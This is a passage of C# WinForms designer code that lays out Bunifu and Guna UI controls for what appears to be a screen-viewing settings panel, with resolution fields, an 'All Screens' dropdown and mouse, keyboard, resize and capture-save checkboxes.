        this.WindowActiveTxt.Cursor = System.Windows.Forms.Cursors.Hand;
        this.WindowActiveTxt.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.WindowActiveTxt.ForeColor = System.Drawing.Color.Black;
        this.WindowActiveTxt.Location = new System.Drawing.Point(126, 7);
        this.WindowActiveTxt.Name = "WindowActiveTxt";
        this.WindowActiveTxt.Size = new System.Drawing.Size(87, 15);
        this.WindowActiveTxt.TabIndex = 649;
        this.WindowActiveTxt.Text = "Window Active";
        this.SizeScreen.AllowParentOverrides = false;
        this.SizeScreen.AutoEllipsis = false;
        this.SizeScreen.AutoSize = false;
        this.SizeScreen.BackColor = System.Drawing.Color.White;
        this.SizeScreen.Cursor = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.CursorType = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.SizeScreen.ForeColor = System.Drawing.Color.DarkGray;
        this.SizeScreen.Location = new System.Drawing.Point(144, 272);
        this.SizeScreen.Name = "SizeScreen";
        this.SizeScreen.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.SizeScreen.Size = new System.Drawing.Size(102, 15);
        this.SizeScreen.TabIndex = 659;
        this.SizeScreen.Text = "1920 x 1080";
        this.SizeScreen.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.SizeScreen.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ScreenY.AcceptsReturn = false;
        this.ScreenY.AcceptsTab = false;
        this.ScreenY.AnimationSpeed = 200;
        this.ScreenY.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenY.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenY.AutoSizeHeight = true;
        this.ScreenY.BackColor = System.Drawing.Color.Transparent;
        this.ScreenY.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenY.BackgroundImage");
        this.ScreenY.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenY.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenY.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenY.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenY.BorderRadius = 2;
        this.ScreenY.BorderThickness = 1;
        this.ScreenY.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenY.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenY.DefaultText = "1080";
        this.ScreenY.Enabled = false;
        this.ScreenY.FillColor = System.Drawing.Color.White;
        this.ScreenY.HideSelection = true;
        this.ScreenY.IconLeft = null;
        this.ScreenY.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.IconPadding = 10;
        this.ScreenY.IconRight = null;
        this.ScreenY.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.Lines = new string[1] { "1080" };
        this.ScreenY.Location = new System.Drawing.Point(81, 265);
        this.ScreenY.MaxLength = 32767;
        this.ScreenY.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenY.Modified = false;
        this.ScreenY.Multiline = false;
        this.ScreenY.Name = "ScreenY";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenY.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnIdleState = stateProperties4;
        this.ScreenY.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenY.PasswordChar = '\0';
        this.ScreenY.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenY.PlaceholderText = "Y";
        this.ScreenY.ReadOnly = false;
        this.ScreenY.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenY.SelectedText = "";
        this.ScreenY.SelectionLength = 0;
        this.ScreenY.SelectionStart = 0;
        this.ScreenY.ShortcutsEnabled = true;
        this.ScreenY.Size = new System.Drawing.Size(59, 28);
        this.ScreenY.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenY.TabIndex = 658;
        this.ScreenY.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenY.TextMarginBottom = 0;
        this.ScreenY.TextMarginLeft = 3;
        this.ScreenY.TextMarginTop = 1;
        this.ScreenY.TextPlaceholder = "Y";
        this.ScreenY.UseSystemPasswordChar = false;
        this.ScreenY.WordWrap = true;
        this.ScreenX.AcceptsReturn = false;
        this.ScreenX.AcceptsTab = false;
        this.ScreenX.AnimationSpeed = 200;
        this.ScreenX.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenX.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenX.AutoSizeHeight = true;
        this.ScreenX.BackColor = System.Drawing.Color.Transparent;
        this.ScreenX.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenX.BackgroundImage");
        this.ScreenX.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenX.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenX.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenX.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenX.BorderRadius = 2;
        this.ScreenX.BorderThickness = 1;
        this.ScreenX.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenX.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenX.DefaultText = "1920";
        this.ScreenX.Enabled = false;
        this.ScreenX.FillColor = System.Drawing.Color.White;
        this.ScreenX.HideSelection = true;
        this.ScreenX.IconLeft = null;
        this.ScreenX.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.IconPadding = 10;
        this.ScreenX.IconRight = null;
        this.ScreenX.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.Lines = new string[1] { "1920" };
        this.ScreenX.Location = new System.Drawing.Point(16, 265);
        this.ScreenX.MaxLength = 32767;
        this.ScreenX.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenX.Modified = false;
        this.ScreenX.Multiline = false;
        this.ScreenX.Name = "ScreenX";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenX.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnIdleState = stateProperties8;
        this.ScreenX.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenX.PasswordChar = '\0';
        this.ScreenX.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenX.PlaceholderText = "X";
        this.ScreenX.ReadOnly = false;
        this.ScreenX.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenX.SelectedText = "";
        this.ScreenX.SelectionLength = 0;
        this.ScreenX.SelectionStart = 0;
        this.ScreenX.ShortcutsEnabled = true;
        this.ScreenX.Size = new System.Drawing.Size(59, 28);
        this.ScreenX.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenX.TabIndex = 604;
        this.ScreenX.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenX.TextMarginBottom = 0;
        this.ScreenX.TextMarginLeft = 3;
        this.ScreenX.TextMarginTop = 1;
        this.ScreenX.TextPlaceholder = "X";
        this.ScreenX.UseSystemPasswordChar = false;
        this.ScreenX.WordWrap = true;
        this.EnabledResize.AllowBindingControlAnimation = true;
        this.EnabledResize.AllowBindingControlColorChanges = false;
        this.EnabledResize.AllowBindingControlLocation = true;
        this.EnabledResize.AllowCheckBoxAnimation = true;
        this.EnabledResize.AllowCheckmarkAnimation = true;
        this.EnabledResize.AllowOnHoverStates = true;
        this.EnabledResize.AutoCheck = true;
        this.EnabledResize.BackColor = System.Drawing.Color.Transparent;
        this.EnabledResize.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledResize.BackgroundImage");
        this.EnabledResize.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledResize.BindingControl = this.TxDelay;
        this.EnabledResize.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledResize.BorderRadius = 6;
        this.EnabledResize.Checked = false;
        this.EnabledResize.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledResize.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledResize.CustomCheckmarkImage = null;
        this.EnabledResize.Location = new System.Drawing.Point(16, 234);
        this.EnabledResize.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledResize.Name = "EnabledResize";
        this.EnabledResize.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.BorderRadius = 6;
        this.EnabledResize.OnCheck.BorderThickness = 2;
        this.EnabledResize.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnCheck.CheckmarkThickness = 2;
        this.EnabledResize.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.BorderRadius = 6;
        this.EnabledResize.OnDisable.BorderThickness = 2;
        this.EnabledResize.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverChecked.BorderRadius = 6;
        this.EnabledResize.OnHoverChecked.BorderThickness = 2;
        this.EnabledResize.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledResize.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledResize.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledResize.OnUncheck.BorderRadius = 6;
        this.EnabledResize.OnUncheck.BorderThickness = 1;
        this.EnabledResize.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledResize.Size = new System.Drawing.Size(21, 21);
        this.EnabledResize.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledResize.TabIndex = 657;
        this.EnabledResize.ThreeState = false;
        this.EnabledResize.ToolTipText = null;
        this.EnabledResize.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledResize_CheckedChanged);
        this.TxDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDelay.AutoSize = true;
        this.TxDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDelay.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxDelay.ForeColor = System.Drawing.Color.Black;
        this.TxDelay.Location = new System.Drawing.Point(40, 238);
        this.TxDelay.Name = "TxDelay";
        this.TxDelay.Size = new System.Drawing.Size(84, 15);
        this.TxDelay.TabIndex = 656;
        this.TxDelay.Text = "Resize Enabled";
        this.CaptureSave.AllowBindingControlAnimation = true;
        this.CaptureSave.AllowBindingControlColorChanges = false;
        this.CaptureSave.AllowBindingControlLocation = true;
        this.CaptureSave.AllowCheckBoxAnimation = true;
        this.CaptureSave.AllowCheckmarkAnimation = true;
        this.CaptureSave.AllowOnHoverStates = true;
        this.CaptureSave.AutoCheck = true;
        this.CaptureSave.BackColor = System.Drawing.Color.Transparent;
        this.CaptureSave.BackgroundImage = (System.Drawing.Image)resources.GetObject("CaptureSave.BackgroundImage");
        this.CaptureSave.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.CaptureSave.BindingControl = this.TxCaptureSave;
        this.CaptureSave.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.CaptureSave.BorderRadius = 6;
        this.CaptureSave.Checked = false;
        this.CaptureSave.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.CaptureSave.Cursor = System.Windows.Forms.Cursors.Hand;
        this.CaptureSave.CustomCheckmarkImage = null;
        this.CaptureSave.Location = new System.Drawing.Point(16, 170);
        this.CaptureSave.MinimumSize = new System.Drawing.Size(17, 17);
        this.CaptureSave.Name = "CaptureSave";
        this.CaptureSave.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnCheck.BorderRadius = 6;
        this.CaptureSave.OnCheck.BorderThickness = 2;
        this.CaptureSave.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.CaptureSave.OnCheck.CheckmarkThickness = 2;
        this.CaptureSave.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.CaptureSave.OnDisable.BorderRadius = 6;
        this.CaptureSave.OnDisable.BorderThickness = 2;
        this.CaptureSave.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.CaptureSave.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.CaptureSave.OnDisable.CheckmarkThickness = 2;
        this.CaptureSave.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.CaptureSave.OnHoverChecked.BorderRadius = 6;
        this.CaptureSave.OnHoverChecked.BorderThickness = 2;
        this.CaptureSave.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CaptureSave.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.CaptureSave.OnHoverChecked.CheckmarkThickness = 2;
        this.CaptureSave.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.CaptureSave.OnHoverUnchecked.BorderRadius = 6;
        this.CaptureSave.OnHoverUnchecked.BorderThickness = 1;
        this.CaptureSave.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.CaptureSave.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.CaptureSave.OnUncheck.BorderRadius = 6;
        this.CaptureSave.OnUncheck.BorderThickness = 1;
        this.CaptureSave.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.CaptureSave.Size = new System.Drawing.Size(21, 21);
        this.CaptureSave.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.CaptureSave.TabIndex = 655;
        this.CaptureSave.ThreeState = false;
        this.CaptureSave.ToolTipText = null;
        this.CaptureSave.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(CaptureSave_CheckedChanged);
        this.TxCaptureSave.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxCaptureSave.AutoSize = true;
        this.TxCaptureSave.BackColor = System.Drawing.Color.Transparent;
        this.TxCaptureSave.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxCaptureSave.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxCaptureSave.ForeColor = System.Drawing.Color.Black;
        this.TxCaptureSave.Location = new System.Drawing.Point(40, 174);
        this.TxCaptureSave.Name = "TxCaptureSave";
        this.TxCaptureSave.Size = new System.Drawing.Size(121, 15);
        this.TxCaptureSave.TabIndex = 654;
        this.TxCaptureSave.Text = "Capture Save Enabled";
        this.EnabledKeyboard.AllowBindingControlAnimation = true;
        this.EnabledKeyboard.AllowBindingControlColorChanges = false;
        this.EnabledKeyboard.AllowBindingControlLocation = true;
        this.EnabledKeyboard.AllowCheckBoxAnimation = true;
        this.EnabledKeyboard.AllowCheckmarkAnimation = true;
        this.EnabledKeyboard.AllowOnHoverStates = true;
        this.EnabledKeyboard.AutoCheck = true;
        this.EnabledKeyboard.BackColor = System.Drawing.Color.Transparent;
        this.EnabledKeyboard.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledKeyboard.BackgroundImage");
        this.EnabledKeyboard.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledKeyboard.BindingControl = this.TxKeyboard;
        this.EnabledKeyboard.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledKeyboard.BorderRadius = 6;
        this.EnabledKeyboard.Checked = false;
        this.EnabledKeyboard.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledKeyboard.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledKeyboard.CustomCheckmarkImage = null;
        this.EnabledKeyboard.Location = new System.Drawing.Point(16, 143);
        this.EnabledKeyboard.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledKeyboard.Name = "EnabledKeyboard";
        this.EnabledKeyboard.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledKeyboard.OnCheck.BorderRadius = 6;
        this.EnabledKeyboard.OnCheck.BorderThickness = 2;
        this.EnabledKeyboard.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledKeyboard.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledKeyboard.OnCheck.CheckmarkThickness = 2;
        this.EnabledKeyboard.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledKeyboard.OnDisable.BorderRadius = 6;
        this.EnabledKeyboard.OnDisable.BorderThickness = 2;
        this.EnabledKeyboard.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledKeyboard.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledKeyboard.OnDisable.CheckmarkThickness = 2;
        this.EnabledKeyboard.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledKeyboard.OnHoverChecked.BorderRadius = 6;
        this.EnabledKeyboard.OnHoverChecked.BorderThickness = 2;
        this.EnabledKeyboard.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledKeyboard.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledKeyboard.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledKeyboard.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledKeyboard.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledKeyboard.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledKeyboard.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledKeyboard.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledKeyboard.OnUncheck.BorderRadius = 6;
        this.EnabledKeyboard.OnUncheck.BorderThickness = 1;
        this.EnabledKeyboard.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledKeyboard.Size = new System.Drawing.Size(21, 21);
        this.EnabledKeyboard.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledKeyboard.TabIndex = 653;
        this.EnabledKeyboard.ThreeState = false;
        this.EnabledKeyboard.ToolTipText = null;
        this.EnabledKeyboard.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledKeyboard_CheckedChanged);
        this.TxKeyboard.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxKeyboard.AutoSize = true;
        this.TxKeyboard.BackColor = System.Drawing.Color.Transparent;
        this.TxKeyboard.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxKeyboard.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxKeyboard.ForeColor = System.Drawing.Color.Black;
        this.TxKeyboard.Location = new System.Drawing.Point(40, 147);
        this.TxKeyboard.Name = "TxKeyboard";
        this.TxKeyboard.Size = new System.Drawing.Size(102, 15);
        this.TxKeyboard.TabIndex = 652;
        this.TxKeyboard.Text = "Keyboard Enabled";
        this.EnabledMouse.AllowBindingControlAnimation = true;
        this.EnabledMouse.AllowBindingControlColorChanges = false;
        this.EnabledMouse.AllowBindingControlLocation = true;
        this.EnabledMouse.AllowCheckBoxAnimation = true;
        this.EnabledMouse.AllowCheckmarkAnimation = true;
        this.EnabledMouse.AllowOnHoverStates = true;
        this.EnabledMouse.AutoCheck = true;
        this.EnabledMouse.BackColor = System.Drawing.Color.Transparent;
        this.EnabledMouse.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledMouse.BackgroundImage");
        this.EnabledMouse.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledMouse.BindingControl = this.TxMouse;
        this.EnabledMouse.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledMouse.BorderRadius = 6;
        this.EnabledMouse.Checked = false;
        this.EnabledMouse.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledMouse.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledMouse.CustomCheckmarkImage = null;
        this.EnabledMouse.Location = new System.Drawing.Point(16, 116);
        this.EnabledMouse.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledMouse.Name = "EnabledMouse";
        this.EnabledMouse.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMouse.OnCheck.BorderRadius = 6;
        this.EnabledMouse.OnCheck.BorderThickness = 2;
        this.EnabledMouse.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMouse.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledMouse.OnCheck.CheckmarkThickness = 2;
        this.EnabledMouse.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledMouse.OnDisable.BorderRadius = 6;
        this.EnabledMouse.OnDisable.BorderThickness = 2;
        this.EnabledMouse.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledMouse.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledMouse.OnDisable.CheckmarkThickness = 2;
        this.EnabledMouse.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledMouse.OnHoverChecked.BorderRadius = 6;
        this.EnabledMouse.OnHoverChecked.BorderThickness = 2;
        this.EnabledMouse.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledMouse.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledMouse.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledMouse.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledMouse.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledMouse.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledMouse.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledMouse.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledMouse.OnUncheck.BorderRadius = 6;
        this.EnabledMouse.OnUncheck.BorderThickness = 1;
        this.EnabledMouse.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledMouse.Size = new System.Drawing.Size(21, 21);
        this.EnabledMouse.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledMouse.TabIndex = 651;
        this.EnabledMouse.ThreeState = false;
        this.EnabledMouse.ToolTipText = null;
        this.EnabledMouse.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledMouse_CheckedChanged);
        this.TxMouse.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxMouse.AutoSize = true;
        this.TxMouse.BackColor = System.Drawing.Color.Transparent;
        this.TxMouse.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxMouse.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxMouse.ForeColor = System.Drawing.Color.Black;
        this.TxMouse.Location = new System.Drawing.Point(40, 120);
        this.TxMouse.Name = "TxMouse";
        this.TxMouse.Size = new System.Drawing.Size(88, 15);
        this.TxMouse.TabIndex = 650;
        this.TxMouse.Text = "Mouse Enabled";
        this.guna2HtmlLabel1.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.DimGray;
        this.guna2HtmlLabel1.Location = new System.Drawing.Point(161, 39);
        this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
        this.guna2HtmlLabel1.Size = new System.Drawing.Size(55, 17);
        this.guna2HtmlLabel1.TabIndex = 645;
        this.guna2HtmlLabel1.Text = "All Screen";
        this.AllScreens.BackColor = System.Drawing.Color.Transparent;
        this.AllScreens.BackgroundColor = System.Drawing.Color.White;
        this.AllScreens.BorderColor = System.Drawing.Color.Silver;
        this.AllScreens.BorderRadius = 1;
        this.AllScreens.Color = System.Drawing.Color.Silver;
        this.AllScreens.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.AllScreens.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.AllScreens.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.AllScreens.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.AllScreens.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.AllScreens.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.AllScreens.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.AllScreens.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.AllScreens.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.AllScreens.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.AllScreens.FillDropDown = true;
        this.AllScreens.FillIndicator = false;
        this.AllScreens.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.AllScreens.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.AllScreens.ForeColor = System.Drawing.Color.Black;
        this.AllScreens.FormattingEnabled = true;
        this.AllScreens.Icon = null;
        this.AllScreens.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.AllScreens.IndicatorColor = System.Drawing.Color.DarkGray;
        this.AllScreens.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.AllScreens.IndicatorThickness = 2;
        this.AllScreens.IsDropdownOpened = false;
        this.AllScreens.ItemBackColor = System.Drawing.Color.White;
        this.AllScreens.ItemBorderColor = System.Drawing.Color.White;
        this.AllScreens.ItemForeColor = System.Drawing.Color.Black;
        this.AllScreens.ItemHeight = 20;
        this.AllScreens.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.AllScreens.ItemHighLightForeColor = System.Drawing.Color.White;
